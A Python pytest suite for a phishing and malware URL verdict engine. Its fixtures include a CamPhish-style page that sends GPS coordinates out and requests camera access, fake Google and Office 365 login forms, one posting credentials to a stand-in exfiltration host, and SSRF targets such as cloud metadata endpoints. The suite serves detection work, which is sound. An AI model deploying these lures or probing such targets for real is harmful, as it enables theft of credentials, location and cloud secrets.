"""
test_phishing_url_threat_verdict_engine.py — Comprehensive Test Suite for Authoritative Phishing & URL Threat Verdict Engine.

Implements all mandatory tests specified in Phase 13 of the CyberGuard Master Hyper Prompt:
  - Test 1A: Known-positive phishing simulation (CamPhish Cloudflare tunnel with meeting template + GPS/camera probe -> PHISHING DETECTED)
  - Test 1B: Reputation-only / unreachable fixture (VT: NOT_FOUND, URLhaus: NO_MATCH, Crawler: UNREACHABLE -> UNKNOWN / UNVERIFIED, NEVER SAFE)
  - Test 2: Legitimate website fixture (100% coverage, verified clean -> NO KNOWN THREATS DETECTED)
  - Test 3: Credential harvesting fixture (login form + password input -> PHISHING DETECTED)
  - Test 4: Malware distribution fixture (executable payload / URLhaus match -> MALWARE DETECTED, distinct from phishing)
  - Test 5: Composite Phishing + Malware fixture (both vectors present -> PHISHING + MALWARE)
  - Test 6: Redirect chain analysis (intermediate threat hop preserved)
  - Test 7: Provider failure handling (graceful degradation, never false SAFE)
  - Test 8: SSRF protection (loopback, RFC 1918, cloud metadata blocked)
  - Test 9: Schema consistency & backward compatibility
  - Test 10: Performance bounds & timeout preservation
"""

import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from fastapi.testclient import TestClient

from backend.main import app
from backend.analysis.url_analyzer import URLAnalyzer
from backend.threats.hosting_intelligence import HostingIntelligenceAnalyzer, HostingContext
from backend.analysis.phishing_engine import PhishingDetectionEngine, PhishingEvaluation
from backend.analysis.malware_url_engine import MalwareURLEngine, MalwareEvaluation
from backend.analysis.url_verdict_engine import (
    URLVerdictEngine,
    URLVerdictResult,
    VERDICT_PHISHING,
    VERDICT_MALWARE,
    VERDICT_PHISHING_AND_MALWARE,
    VERDICT_SUSPICIOUS,
    VERDICT_UNKNOWN_UNVERIFIED,
    VERDICT_NO_KNOWN_THREATS,
)
from backend.threats.models import RiskLevel, ThreatCategory
from backend.threats.virustotal import VirusTotalProvider
from backend.threats.urlhaus import URLhausProvider
from backend.analysis.url_resolver import ResolutionResult, ResolutionStatus, RedirectHop, PageMetadata


# ── TEST 1A: KNOWN-POSITIVE PHISHING SIMULATION (CamPhish Cloudflare Tunnel) ───

@pytest.mark.asyncio
async def test_1a_camphish_cloudflare_tunnel_phishing_detected():
    """
    Test 1A: Authorized security test recreation.
    URL: https://colin-representations-murray-reveals.trycloudflare.com
    Template: CamPhish [03] Online Meeting with active GPS and camera probing.
    Must evaluate to PHISHING DETECTED with HIGH or CRITICAL severity.
    """
    camphish_url = "https://colin-representations-murray-reveals.trycloudflare.com"

    # Simulated CamPhish template DOM with geolocation and mediaDevices probes
    camphish_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Online Meeting Room | Join Video Conference</title>
    </head>
    <body>
        <h2>Meeting Room: Daily Standup</h2>
        <p>Please allow camera and location access to join the conference room.</p>
        <script>
            // CamPhish sensitive sensor probes
            navigator.geolocation.getCurrentPosition(function(pos) {
                var lat = pos.coords.latitude;
                var lon = pos.coords.longitude;
                fetch('/post.php', { method: 'POST', body: 'lat=' + lat + '&lon=' + lon });
            });
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(function(stream) {
                // capture webcam frames
            });
        </script>
    </body>
    </html>
    """

    # 1. Evaluate Hosting Intelligence
    hosting_ctx = HostingIntelligenceAnalyzer.analyze(camphish_url)
    assert hosting_ctx.is_ephemeral_tunnel is True
    assert "Cloudflare" in hosting_ctx.provider_name
    assert hosting_ctx.base_domain == "trycloudflare.com"
    assert hosting_ctx.is_multi_word_slug is True

    # 2. Evaluate Phishing Engine
    dom_insp = {
        "status": "COMPLETED",
        "is_live": True,
        "status_code": 200,
        "title": "Online Meeting Room | Join Video Conference",
        "has_credential_forms": False,
        "has_sensor_probes": True,
        "sensor_permission_state": "PERMISSION_PROBE_DETECTED",
        "detected_sensor_types": ["GEOLOCATION", "CAMERA", "MICROPHONE"],
        "social_engineering_lures": ["Online Meeting (CamPhish / Video Conference Lure)"],
        "raw_html": camphish_html,
    }

    phishing_eval = PhishingDetectionEngine.evaluate(
        url=camphish_url,
        hostname="colin-representations-murray-reveals.trycloudflare.com",
        page_content=camphish_html,
        dom_inspection=dom_insp,
        hosting_ctx=hosting_ctx,
        page_title="Online Meeting Room | Join Video Conference",
    )

    assert phishing_eval.is_phishing is True
    assert phishing_eval.sensitive_permission_probe_detected is True
    assert "GEOLOCATION" in phishing_eval.probed_permissions
    assert "CAMERA_MICROPHONE" in phishing_eval.probed_permissions
    assert phishing_eval.social_engineering_detected is True

    # 3. Evaluate Malware Engine (no malware distribution)
    malware_eval = MalwareURLEngine.evaluate(url=camphish_url)
    assert malware_eval.is_malware is False

    # 4. Synthesize Verdict with URLVerdictEngine
    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=camphish_url,
        phishing_eval=phishing_eval,
        malware_eval=malware_eval,
        hosting_ctx=hosting_ctx,
        vt_report={"status": "NOT_FOUND"},
        uh_report={"status": "NO_MATCH", "matched": False},
        live_intel={"live_page_inspection": dom_insp},
    )

    assert verdict_res.verdict == VERDICT_PHISHING
    assert verdict_res.verdict_display == "PHISHING DETECTED"
    assert verdict_res.severity in (RiskLevel.HIGH, RiskLevel.CRITICAL)
    assert verdict_res.threat_category == ThreatCategory.PHISHING
    assert verdict_res.classification == "MALICIOUS"
    assert verdict_res.is_unverified is False


# ── TEST 1B: REPUTATION-ONLY / UNREACHABLE FIXTURE (The False-Safe Defect Fix) ──

@pytest.mark.asyncio
async def test_1b_unreachable_tunnel_evaluates_to_unknown_unverified_never_safe():
    """
    Test 1B: Exact defect observed in user screenshot.
    URL: https://colin-representations-murray-reveals.trycloudflare.com
    VT: NOT_FOUND
    URLhaus: NO_MATCH
    Crawler: OFFLINE / UNREACHABLE
    Credential harvesting: UNVERIFIED / OFFLINE
    System MUST return UNKNOWN / UNVERIFIED. Under NO circumstances may it declare SAFE.
    """
    url = "https://colin-representations-murray-reveals.trycloudflare.com"

    hosting_ctx = HostingIntelligenceAnalyzer.analyze(url)
    assert hosting_ctx.is_ephemeral_tunnel is True

    # Crawler failed / offline
    dom_insp = {
        "status": "UNREACHABLE",
        "is_live": False,
        "has_credential_forms": False,
        "credential_inspection_state": "UNVERIFIED_OFFLINE",
        "has_sensor_probes": False,
        "sensor_permission_state": "UNVERIFIED_OFFLINE",
    }

    phishing_eval = PhishingDetectionEngine.evaluate(
        url=url,
        hostname="colin-representations-murray-reveals.trycloudflare.com",
        page_content="",
        dom_inspection=dom_insp,
        hosting_ctx=hosting_ctx,
    )

    malware_eval = MalwareURLEngine.evaluate(
        url=url,
        vt_report={"status": "NOT_FOUND"},
        uh_report={"status": "NO_MATCH", "matched": False},
    )

    live_intel = {
        "status": "UNREACHABLE",
        "live_page_inspection": dom_insp,
    }

    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=url,
        phishing_eval=phishing_eval,
        malware_eval=malware_eval,
        hosting_ctx=hosting_ctx,
        vt_report={"status": "NOT_FOUND"},
        uh_report={"status": "NO_MATCH", "matched": False},
        live_intel=live_intel,
    )

    # MUST be UNKNOWN / UNVERIFIED, NEVER SAFE!
    assert verdict_res.verdict == VERDICT_UNKNOWN_UNVERIFIED
    assert verdict_res.verdict_display == "UNKNOWN / UNVERIFIED"
    assert verdict_res.severity == RiskLevel.UNVERIFIED
    assert verdict_res.classification != "SAFE"
    assert verdict_res.confidence_level == "INSUFFICIENT"
    assert verdict_res.assessment_confidence == "INSUFFICIENT"
    assert verdict_res.is_unverified is True
    assert verdict_res.scan_coverage_pct < 60.0
    assert verdict_res.provider_states.get("credential_inspection") == "NOT_ASSESSED"
    assert "absence of intelligence" in verdict_res.reasoning.lower() or "not equate" in verdict_res.reasoning.lower()


# ── TEST 2: LEGITIMATE WEBSITE FIXTURE (Verified 100% Clean) ───────────────────

@pytest.mark.asyncio
async def test_2_legitimate_website_verified_clean():
    """
    Test 2: Legitimate site with 100% inspection coverage.
    VT: COMPLETED, 0 malicious out of 90 engines.
    URLhaus: NO_MATCH.
    Crawler: ONLINE 200, clean DOM, no credential forms, no sensor probes.
    Verdict: NO KNOWN THREATS DETECTED, RiskLevel.SAFE.
    """
    url = "https://github.com/torvalds/linux"

    hosting_ctx = HostingIntelligenceAnalyzer.analyze(url)
    assert hosting_ctx.is_ephemeral_tunnel is False

    dom_insp = {
        "status": "COMPLETED",
        "is_live": True,
        "status_code": 200,
        "title": "GitHub - torvalds/linux: Linux kernel source tree",
        "has_credential_forms": False,
        "credential_inspection_state": "CLEAN_NO_FORMS",
        "has_sensor_probes": False,
        "sensor_permission_state": "CLEAN_NO_PROBES",
    }

    phishing_eval = PhishingDetectionEngine.evaluate(
        url=url,
        hostname="github.com",
        page_content="<html><head><title>Linux kernel source tree</title></head><body>Source code</body></html>",
        dom_inspection=dom_insp,
        hosting_ctx=hosting_ctx,
        page_title="GitHub - torvalds/linux",
    )

    vt_report = {
        "status": "COMPLETED",
        "summary": {"malicious": 0, "suspicious": 0, "harmless": 85, "undetected": 5, "total_engines": 90},
        "malicious_count": 0,
        "suspicious_count": 0,
        "total_engines": 90,
    }

    uh_report = {
        "status": "NO_MATCH",
        "matched": False,
    }

    malware_eval = MalwareURLEngine.evaluate(
        url=url,
        vt_report=vt_report,
        uh_report=uh_report,
    )

    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=url,
        phishing_eval=phishing_eval,
        malware_eval=malware_eval,
        hosting_ctx=hosting_ctx,
        vt_report=vt_report,
        uh_report=uh_report,
        live_intel={"live_page_inspection": dom_insp},
    )

    assert verdict_res.verdict == VERDICT_NO_KNOWN_THREATS
    assert verdict_res.verdict_display == "NO KNOWN THREATS DETECTED"
    assert verdict_res.severity == RiskLevel.SAFE
    assert verdict_res.classification == "SAFE"
    assert verdict_res.scan_coverage_pct == 100.0
    assert verdict_res.is_unverified is False


# ── TEST 3: CREDENTIAL HARVESTING FIXTURE ─────────────────────────────────────

@pytest.mark.asyncio
async def test_3_credential_harvesting_phishing_detected():
    """
    Test 3: Credential harvesting page with password inputs, brand impersonation.
    Verdict: PHISHING DETECTED, distinct from malware.
    """
    phish_url = "http://account-security-update.xyz/login.php"

    phish_html = """
    <html>
    <head><title>Google Accounts - Sign In to Verify</title></head>
    <body>
        <form action="http://malicious-exfiltrator.top/collect.php" method="POST">
            <input type="text" name="email" placeholder="Email" />
            <input type="password" name="password" placeholder="Password" />
            <button type="submit">Verify Account</button>
        </form>
    </body>
    </html>
    """

    dom_insp = {
        "status": "COMPLETED",
        "is_live": True,
        "has_credential_forms": True,
        "credential_inspection_state": "HARVESTING_DETECTED",
        "has_sensor_probes": False,
        "raw_html": phish_html,
    }

    phishing_eval = PhishingDetectionEngine.evaluate(
        url=phish_url,
        page_content=phish_html,
        dom_inspection=dom_insp,
        page_title="Google Accounts - Sign In to Verify",
    )

    assert phishing_eval.is_phishing is True
    assert phishing_eval.credential_harvesting_detected is True
    assert phishing_eval.brand_impersonation_detected is True
    assert phishing_eval.impersonated_brand == "Google"

    malware_eval = MalwareURLEngine.evaluate(url=phish_url)
    assert malware_eval.is_malware is False

    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=phish_url,
        phishing_eval=phishing_eval,
        malware_eval=malware_eval,
        hosting_ctx=HostingIntelligenceAnalyzer.analyze(phish_url),
        live_intel={"live_page_inspection": dom_insp},
    )

    assert verdict_res.verdict == VERDICT_PHISHING
    assert verdict_res.verdict_display == "PHISHING DETECTED"
    assert verdict_res.severity in (RiskLevel.HIGH, RiskLevel.CRITICAL)


# ── TEST 4: MALWARE DISTRIBUTION FIXTURE ──────────────────────────────────────

@pytest.mark.asyncio
async def test_4_malware_distribution_distinct_from_phishing():
    """
    Test 4: Malware payload delivery URL.
    Executable download, URLhaus positive match.
    Verdict: MALWARE DETECTED, strictly distinguished from phishing.
    """
    mal_url = "http://42.179.116.166:55253/payload.exe"

    uh_report = {
        "status": "MATCH",
        "matched": True,
        "classification": "malware_distribution_url",
        "threat": "Mozi.elf",
        "url_status": "online",
        "external_reference": "https://urlhaus.abuse.ch/url/3923115/",
    }

    vt_report = {
        "status": "COMPLETED",
        "summary": {"malicious": 14, "suspicious": 2, "harmless": 20, "undetected": 10, "total_engines": 46},
        "malicious_count": 14,
        "total_engines": 46,
    }

    malware_eval = MalwareURLEngine.evaluate(
        url=mal_url,
        vt_report=vt_report,
        uh_report=uh_report,
    )

    assert malware_eval.is_malware is True
    assert malware_eval.payload_extension_detected == ".exe"
    assert malware_eval.urlhaus_matched is True

    # Phishing evaluation is clean (no login forms or social lures)
    phishing_eval = PhishingDetectionEngine.evaluate(url=mal_url)
    assert phishing_eval.is_phishing is False

    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=mal_url,
        phishing_eval=phishing_eval,
        malware_eval=malware_eval,
        hosting_ctx=HostingIntelligenceAnalyzer.analyze(mal_url),
        vt_report=vt_report,
        uh_report=uh_report,
    )

    assert verdict_res.verdict == VERDICT_MALWARE
    assert verdict_res.verdict_display == "MALWARE DETECTED"
    assert verdict_res.severity in (RiskLevel.HIGH, RiskLevel.CRITICAL)
    assert verdict_res.threat_category == ThreatCategory.MALICIOUS_URL


# ── TEST 5: COMPOSITE PHISHING + MALWARE FIXTURE ──────────────────────────────

@pytest.mark.asyncio
async def test_5_phishing_and_malware_composite():
    """
    Test 5: Both phishing (credential harvesting form) AND malware payload delivery present.
    Verdict: PHISHING + MALWARE.
    """
    dual_threat_url = "http://deceptive-portal.top/invoice.pdf.exe"

    html = """
    <html>
    <head><title>Microsoft Office 365 Security Verification</title></head>
    <body>
        <form action="/login.php" method="POST">
            <input type="password" name="passwd" />
            <button>Log In to Download Invoice</button>
        </form>
    </body>
    </html>
    """

    dom_insp = {
        "status": "COMPLETED",
        "is_live": True,
        "has_credential_forms": True,
        "raw_html": html,
    }

    phishing_eval = PhishingDetectionEngine.evaluate(
        url=dual_threat_url,
        page_content=html,
        dom_inspection=dom_insp,
        page_title="Microsoft Office 365 Security Verification",
    )
    assert phishing_eval.is_phishing is True

    uh_report = {
        "status": "MATCH",
        "matched": True,
        "classification": "malware_distribution_url",
        "threat": "Trojan.Agent",
    }

    malware_eval = MalwareURLEngine.evaluate(
        url=dual_threat_url,
        uh_report=uh_report,
    )
    assert malware_eval.is_malware is True
    assert malware_eval.is_double_extension is True

    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=dual_threat_url,
        phishing_eval=phishing_eval,
        malware_eval=malware_eval,
        hosting_ctx=HostingIntelligenceAnalyzer.analyze(dual_threat_url),
        uh_report=uh_report,
        live_intel={"live_page_inspection": dom_insp},
    )

    assert verdict_res.verdict == VERDICT_PHISHING_AND_MALWARE
    assert verdict_res.verdict_display == "PHISHING + MALWARE"
    assert verdict_res.severity == RiskLevel.CRITICAL


# ── TEST 6: REDIRECT ANALYSIS (Intermediate Threat Hop Preserved) ─────────────

@pytest.mark.asyncio
async def test_6_redirect_chain_preserves_intermediate_threat():
    """
    Test 6: Redirect chain where intermediate hop is tracked malware,
    even if the terminal URL is benign or an information page.
    """
    chain = [
        {"from_url": "http://short.ly/xyz", "to_url": "http://tracked-malware-drop.com/bot.exe"},
        {"from_url": "http://tracked-malware-drop.com/bot.exe", "to_url": "https://landing-page.com/"},
    ]

    associated_iocs = [
        {"value": "http://tracked-malware-drop.com/bot.exe", "scope": "URLHAUS_RECORDED_MALWARE_URL", "threat": "Mirai"}
    ]

    malware_eval = MalwareURLEngine.evaluate(
        url="http://short.ly/xyz",
        redirect_chain=chain,
        associated_iocs=associated_iocs,
    )

    assert malware_eval.associated_malware_url == "http://tracked-malware-drop.com/bot.exe"
    assert malware_eval.is_malware is True


# ── TEST 7: PROVIDER FAILURE / TIMEOUT RESILIENCE ─────────────────────────────

@pytest.mark.asyncio
async def test_7_provider_failure_returns_graceful_unverified_no_false_safe():
    """
    Test 7: When VT times out and URLhaus throws an error,
    the pipeline must NOT fall back to SAFE.
    Must return UNKNOWN / UNVERIFIED.
    """
    url = "https://unresponsive-site-555.com"

    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=url,
        phishing_eval=PhishingEvaluation(),
        malware_eval=MalwareEvaluation(),
        hosting_ctx=HostingContext(),
        vt_report={"status": "TIMEOUT", "message": "Request timed out"},
        uh_report={"status": "ERROR", "message": "Connection refused"},
        live_intel={"status": "UNREACHABLE", "live_page_inspection": {"is_live": False}},
    )

    assert verdict_res.verdict == VERDICT_UNKNOWN_UNVERIFIED
    assert verdict_res.verdict_display == "UNKNOWN / UNVERIFIED"
    assert verdict_res.severity != RiskLevel.SAFE
    assert verdict_res.is_unverified is True


# ── TEST 8: SSRF PRE-FLIGHT AND PROTECTION ────────────────────────────────────

def test_8_ssrf_protection_blocks_private_destinations():
    """
    Test 8: SSRF attacks targeting localhost, RFC 1918, or cloud metadata.
    Must be blocked before any outbound connection attempt.
    """
    from backend.analysis.url_resolver import SSRFValidator

    bad_targets = [
        "http://127.0.0.1:8080/admin",
        "http://localhost:5000/metrics",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.5/api/keys",
        "http://192.168.1.1/config",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]

    for target in bad_targets:
        safe, is_ssrf, reason, _, _, _ = SSRFValidator.validate_url(target)
        assert not safe, f"Target '{target}' should have been blocked by SSRFValidator."
        assert is_ssrf, f"Target '{target}' should have been identified as SSRF."


# ── TEST 9: SCHEMA CONSISTENCY & BACKWARD COMPATIBILITY ───────────────────────

@pytest.mark.asyncio
async def test_9_api_schema_consistency_through_threat_intelligence_search():
    """
    Test 9: Verify that GET /api/threats/search returns all required forensic fields:
    verdict, verdict_display, scan_coverage_pct, is_unverified, hosting_intelligence,
    phishing_evaluation, malware_evaluation, and updated live_crawler forensics.
    """
    client = TestClient(app)

    with patch.object(VirusTotalProvider, "get_url_report", AsyncMock(return_value={"status": "NOT_FOUND"})):
        with patch.object(VirusTotalProvider, "is_configured", True):
            with patch.object(URLhausProvider, "lookup_url", AsyncMock(return_value={"status": "NO_MATCH", "matched": False})):
                with patch.object(URLhausProvider, "is_configured", True):
                    resp = client.get("/api/threats/search?ioc=https://colin-representations-murray-reveals.trycloudflare.com")
                    assert resp.status_code == 200
                    data = resp.json()

                    # Overall event attributes
                    assert "severity" in data
                    assert "classification" in data
                    assert data["classification"] != "SAFE"

                    # Threat Intelligence payload attributes
                    ti = data.get("threat_intelligence", {})
                    assert "verdict_display" in ti
                    assert ti["verdict_display"] == "UNKNOWN / UNVERIFIED"
                    assert "is_unverified" in ti
                    assert ti["is_unverified"] is True
                    assert "scan_coverage_pct" in ti
                    assert isinstance(ti["scan_coverage_pct"], (int, float))

                    # Sub-engine contracts
                    assert "hosting_intelligence" in ti
                    assert ti["hosting_intelligence"].get("is_ephemeral_tunnel") is True
                    assert "phishing_evaluation" in ti
                    assert "malware_evaluation" in ti
                    assert "url_verdict" in ti

                    # Crawler forensics tile contracts
                    live_crawler = ti.get("providers", {}).get("live_crawler", {})
                    assert "credential_inspection_state" in live_crawler
                    assert "sensor_permission_state" in live_crawler
                    assert "has_sensor_probes" in live_crawler


# ── TEST 10: PERFORMANCE AND TIMEOUT BOUNDS ───────────────────────────────────

@pytest.mark.asyncio
async def test_10_analyzer_pipeline_executes_within_performance_budget():
    """
    Test 10: Verify the full URLAnalyzer pipeline completes within bounded latency
    and populates the performance metrics dict.
    """
    analyzer = URLAnalyzer()
    event = await analyzer.analyze("https://github.com/torvalds/linux", local_only=True)

    assert event is not None
    ti = event.threat_intelligence
    assert "performance" in ti
    perf = ti["performance"]
    assert "total_ms" in perf
    assert "local_heuristics_ms" in perf
    assert perf["total_ms"] < 5000.0  # Must complete well within 5 seconds for local heuristics


# ── TEST 11: NETWORK TRAFFIC TELEMETRY & SENSITIVE API EXFILTRATION ──────────

@pytest.mark.asyncio
async def test_11_network_traffic_telemetry_exfiltration_detection():
    """
    Test 11: Defect A & D verification.
    Simulate network telemetry where a webpage requests geolocation and sends
    coordinates via POST to a backend script (/post.php) or webhook.
    PhishingDetectionEngine and URLVerdictEngine must flag exfiltration telemetry
    and classify as PHISHING DETECTED.
    """
    from backend.threats.network_telemetry import NetworkTrafficIntelligenceEngine, NetworkRequestRecord

    target_url = "https://legit-looking-meeting-portal.trycloudflare.com"
    hosting_ctx = HostingIntelligenceAnalyzer.analyze(target_url)

    # 1. Build simulated runtime network telemetry
    requests = [
        NetworkRequestRecord(
            url=f"{target_url}/",
            method="GET",
            resource_type="document",
            status_code=200,
        ),
        NetworkRequestRecord(
            url=f"{target_url}/post.php",
            method="POST",
            resource_type="xhr",
            status_code=200,
        ),
    ]

    sensor_probes = [{"sensor": "GEOLOCATION", "api": "navigator.geolocation.getCurrentPosition"}]
    telemetry_report = NetworkTrafficIntelligenceEngine.analyze_traffic(
        base_url=target_url,
        requests=requests,
        sensor_probes=sensor_probes,
        is_ephemeral_tunnel=True,
    )

    assert telemetry_report.total_requests == 2
    assert len(telemetry_report.exfiltration_events) >= 1
    assert telemetry_report.network_risk_score >= 0.85
    assert any("CORRELATED EXFILTRATION" in p for p in telemetry_report.traffic_patterns_detected)

    # 2. Feed telemetry report to PhishingDetectionEngine
    dom_insp = {
        "status": "COMPLETED",
        "is_live": True,
        "has_credential_forms": False,
        "has_sensor_probes": True,
        "sensor_permission_state": "PERMISSION_PROBE_DETECTED",
        "detected_sensor_types": ["GEOLOCATION"],
        "social_engineering_lures": ["Video Conference / Meeting Lure"],
    }

    phishing_eval = PhishingDetectionEngine.evaluate(
        url=target_url,
        hostname="legit-looking-meeting-portal.trycloudflare.com",
        page_content="<html><script>navigator.geolocation.getCurrentPosition()</script></html>",
        dom_inspection=dom_insp,
        hosting_ctx=hosting_ctx,
        network_traffic=telemetry_report.to_dict(),
    )

    assert phishing_eval.is_phishing is True
    assert phishing_eval.sensitive_permission_probe_detected is True
    assert "GEOLOCATION" in phishing_eval.probed_permissions
    assert phishing_eval.confidence >= 0.85

    # 3. Synthesize final verdict
    verdict_res = URLVerdictEngine.synthesize_verdict(
        url=target_url,
        phishing_eval=phishing_eval,
        malware_eval=MalwareEvaluation(),
        hosting_ctx=hosting_ctx,
        vt_report={"status": "NOT_FOUND"},
        uh_report={"status": "NO_MATCH", "matched": False},
        live_intel={"live_page_inspection": dom_insp, "network_traffic": telemetry_report.to_dict()},
    )

    assert verdict_res.verdict == VERDICT_PHISHING
    assert verdict_res.verdict_display == "PHISHING DETECTED"
    assert verdict_res.severity in (RiskLevel.HIGH, RiskLevel.CRITICAL)
    assert verdict_res.observed_risk_level in ("HIGH", "CRITICAL")
    assert verdict_res.network_traffic is not None
    assert len(verdict_res.network_traffic["exfiltration_events"]) >= 1


# ── TEST 12: GRANULAR UNREACHABLE FAILURE DIAGNOSTICS ────────────────────────

def test_12_granular_unreachable_failure_diagnostics():
    """
    Test 12: Defect C & E verification.
    Verify that classify_network_failure decomposes generic errors into granular
    actionable failure states: DNS resolution, connection refused, connection timeout,
    TLS handshake failure, and anti-bot challenge.
    Verify that unreachable states report credential_inspection = NOT_ASSESSED.
    """
    import socket
    import ssl
    import httpx
    from backend.threats.live_intel_scraper import LiveIntelScraper, classify_network_failure

    test_url = "https://test-unreachable.example.com"

    # 1. DNS Resolution failure
    dns_err = socket.gaierror(11001, "getaddrinfo failed")
    state, msg = classify_network_failure(dns_err, test_url)
    assert state == "DNS_RESOLUTION_FAILED"
    assert "DNS" in msg

    # 2. Connection Refused
    conn_err = ConnectionRefusedError(10061, "Connection refused")
    state, msg = classify_network_failure(conn_err, test_url)
    assert state == "CONNECTION_REFUSED"
    assert "refused" in msg.lower()

    # 3. Connection Timeout
    timeout_err = TimeoutError("Connection timed out")
    state, msg = classify_network_failure(timeout_err, test_url)
    assert state == "CONNECTION_TIMEOUT"
    assert "timed out" in msg.lower()

    # 4. TLS Handshake Failed
    tls_err = ssl.SSLCertVerificationError("certificate verify failed")
    state, msg = classify_network_failure(tls_err, test_url)
    assert state == "TLS_HANDSHAKE_FAILED"
    assert "TLS" in msg

    # 5. Anti-Bot / Cloudflare Challenge
    bot_resp_text = "<html><title>Just a moment...</title><body>Checking your browser before accessing... Cloudflare Ray ID: 12345</body></html>"
    assert LiveIntelScraper.is_anti_bot_challenge(403, bot_resp_text) is True
    assert LiveIntelScraper.is_anti_bot_challenge(503, "Attention Required! | Cloudflare") is True
    assert LiveIntelScraper.is_anti_bot_challenge(200, "<html>Standard Page</html>") is False

